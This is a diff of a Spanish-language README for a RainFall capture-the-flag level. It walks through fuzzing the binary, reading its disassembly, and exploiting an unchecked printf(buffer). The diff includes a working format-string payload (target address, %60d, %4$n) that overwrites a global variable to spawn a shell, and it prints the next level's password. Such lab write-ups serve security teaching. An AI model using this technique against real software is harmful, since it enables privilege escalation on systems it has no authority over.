@@ -70,94 +70,36 @@ level3@RainFall:~$ readelf -S ./level3 | grep -E ".got|.plt"
 
 # 4. Fuzzing:
 
-Probamos diferentes maneras de ejecutar el binario hasta lograr romperlo:
+Probamos diferentes maneras de ejecutar el binario hasta lograr romperlo por tamaño de entrada::
 
 ```
-level3@RainFall:~$ (printf 'A%.0s' {1..58500000};) | ./level3 
-
-a
-
-a
-
-a-bash: xmalloc: ../bash/braces.c:627: cannot allocate 9 bytes (2947088384 bytes allocated)
-level3@RainFall:~$ 
-level3@RainFall:~$ a
-
-a: command not found
-level3@RainFall:~$ 
-level3@RainFall:~$ a
-a: command not found
-level3@RainFall:~$ 
-level3@RainFall:~$ a
-a: command not found
-level3@RainFall:~$ 
-level3@RainFall:~$ ./level3
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA01234567891011121314151617181920
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlevel3@RainFall:~$
-
-level3@RainFall:~$ (printf 'A%.0s' {1..511}; printf '\n'; $(whoami); cat) | ./level3 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlevel3: command not found
-whoami
+level3@RainFall:~$ (printf 'A%.0s' {1..600};) | ./level3 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
 level3@RainFall:~$
 
-level3@RainFall:~$ (printf 'A%.0s' {1..520}; printf '64'; cat) | ./level3 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-level3@RainFall:~$ (printf 'A%.0s' {1..5}; printf '64'; cat) | ./level3 
-64
-AAAAA6464
-whoami
-level3@RainFall:~$ 
-
 ```
 
-* El binario `level3` mantiene abierta una shell y copia la cadena de caracteres usando la función `fgets()` que tiene límite de lectura. Por lo tanto no podemos romper el buffer por tamaño (buffer overflow). 
+* **Observación:** El binario no genera un `Segmentation fault` aunque enviemos mucha basura. Esto se debe a que utiliza la función `fgets()`, que tiene un límite estricto de lectura (visto en el ensamblador como 0x200, es decir, 512 bytes). El desbordamiento de buffer clásico es imposible aquí.. 
 
 # 5. Reverse Engineering (Target Identification):
 
-```
-DDump of assembler code for function main:
-  0x0804851a <+0>:	push   ebp
-  0x0804851b <+1>:	mov    ebp,esp
-  0x0804851d <+3>:	and    esp,0xfffffff0
-  0x08048520 <+6>:	call   0x80484a4 <v>
-  0x08048525 <+11>  leave  
-  0x08048526 <+12>: ret    
-End of assembler dump.
-Dump of assembler code for function v:
-  0x080484a4 <+0>:	   push   ebp
-  0x080484a5 <+1>:	   mov    ebp,esp
-  0x080484a7 <+3>:	   sub    esp,0x218                     // -> 538 bytes (0x218) 
-  0x080484ad <+9>:	   mov    eax,ds:0x8049860
-  0x080484b2 <+14>:	   mov    DWORD PTR [esp+0x8],eax
-  0x080484b6 <+18>:	   mov    DWORD PTR [esp+0x4],0x200
-  0x080484be <+26>:	   lea    eax,[ebp-0x208]
-  0x080484c4 <+32>:	   mov    DWORD PTR [esp],eax
-  0x080484c7 <+35>:	   call   0x80483a0 <fgets@plt>
-  0x080484cc <+40>:	   lea    eax,[ebp-0x208]
-  0x080484d2 <+46>:	   mov    DWORD PTR [esp],eax
-  0x080484d5 <+49>:	   call   0x8048390 <printf@plt>
-  0x080484da <+54>:	   mov    eax,ds:0x804988c
-  0x080484df <+59>:	   cmp    eax,0x40
-  0x080484e2 <+62>:	   jne    0x8048518 <v+116>
-  0x080484e4 <+64>:	   mov    eax,ds:0x8049880
-  0x080484e9 <+69>:	   mov    edx,eax
-  0x080484eb <+71>:	   mov    eax,0x8048600
-  0x080484f0 <+76>:	   mov    DWORD PTR [esp+0xc],edx
-  0x080484f4 <+80>:	   mov    DWORD PTR [esp+0x8],0xc
-  0x080484fc <+88>:	   mov    DWORD PTR [esp+0x4],0x1
-  0x08048504 <+96>:	   mov    DWORD PTR [esp],eax
-  0x08048507 <+99>:	   call   0x80483b0 <fwrite@plt>
-  0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
-  0x08048513 <+111>:	call   0x80483c0 <system@plt>
-  0x08048518 <+116>:	leave  
-  0x08048519 <+117>:	ret    
-End of assembler dump.
+Análisis de la función v
 
+```
+0x080484b6 <+18>:    mov    DWORD PTR [esp+0x4],0x200    ; Límite de 512 bytes para fgets
+0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
+...
+0x080484d2 <+46>:    mov    DWORD PTR [esp],eax          ; Dirección del buffer
+0x080484d5 <+49>:    call   0x8048390 <printf@plt>       ; VULNERABILIDAD: printf(buffer)
+...
+0x080484da <+54>:    mov    eax,ds:0x804988c             ; Carga variable 'm'
+0x080484df <+59>:    cmp    eax,0x40                     ; Compara m con 64 (0x40)
+0x080484e2 <+62>:    jne    0x8048518 <v+116>            ; Si no es 64, sale
 ```
 
 Para ver con detalle el analisis consuta el archivo  [asm_analysis.md](https://github.com/4trastos/Rainfall/blob/main/level3/Resources/README.md) en conjunto con el programa de demostración  [source.c](https://github.com/4trastos/Rainfall/blob/main/level3/source.c).
 
-# 6. Solución:
+# 6. Solución: Format String Attack.
 
 1. Tras analizar el desensamblado en el punto anterior, vemos que solo podemos atacar el binairo desde dentro de la función `v`.
 ```asm
@@ -186,21 +128,34 @@ Para ver con detalle el analisis consuta el archivo  [asm_analysis.md](https://g
 
 4. **Objetivo:** 
 
-```
-level3@RainFall:~$ echo "AAAAA %p %p %p %p %p" | ./level3
-AAAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x70252041
+Nuestro objetivo es escribir el valor **64** en la dirección de memoria de la variable global `m` (`0x0804988c`).
 
+1. **`\x8c\x98\x04\x08`**: Dirección de la variable `m`. Ocupa los primeros **4 bytes** del string.
+2. **`%60d`**: Imprime un entero con un ancho de 60 caracteres. Esto genera **60 bytes** de salida.
+3. **`%4$n`**: Toma el total de bytes escritos hasta ahora () y los escribe en la dirección apuntada por el 4º argumento del stack (que es nuestra dirección `0x0804988c`).
+
+### **C) Ejecución**
+
+```bash
 level3@RainFall:~$ (printf "\x8c\x98\x04\x08"; printf "%%60d%%4\$n"; cat) | ./level3 
-
-�                                                         512
+... (60 espacios) ...
 Wait what?!
 whoami
 level4
-cd ..
-cd level4
-cat .pass
+cat /home/user/level4/.pass
 b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
-^C
-level3@RainFall:~$ 
+
 ```
+
+---
+
+# **7. Conclusión:**
+
+El **Level 3** marca un cambio de paradigma en el taller Rainfall. Mientras que los niveles 0, 1 y 2 se centraban en la corrupción de la memoria mediante el desbordamiento de buffers (*Buffer Overflow*), este nivel introduce la vulnerabilidad de **Cadena de Formato (Format String)**.
+
+La seguridad del binario se ve comprometida por una implementación incorrecta de la función `printf`. Al pasar el buffer de usuario directamente como primer argumento (`printf(buffer)`) en lugar de usar un especificador de formato (`printf("%s", buffer)`), el programa otorga al atacante la capacidad de interactuar con la pila de forma imprevista.
+
+Mediante el uso de especificadores como `%p`, logramos mapear la memoria y localizar nuestra propia entrada en el cuarto parámetro de la pila. El factor determinante para la resolución fue el uso del especificador `%n`, que en lugar de imprimir datos, **escribe** el número de bytes impresos hasta ese momento en una dirección de memoria proporcionada.
+
+Al dirigir esta escritura hacia la variable global ubicada en `0x0804988c` y forzar un valor de **64** (0x40 en hexadecimal) mediante el ancho de campo de `printf` (`%60d` + 4 bytes de la dirección inicial), logramos manipular el flujo lógico del programa. Esto permitió evadir la instrucción `jne` (jump if not equal) y forzar la ejecución de la llamada a `system("/bin/sh")`, obteniendo así privilegios de **level4**.
 
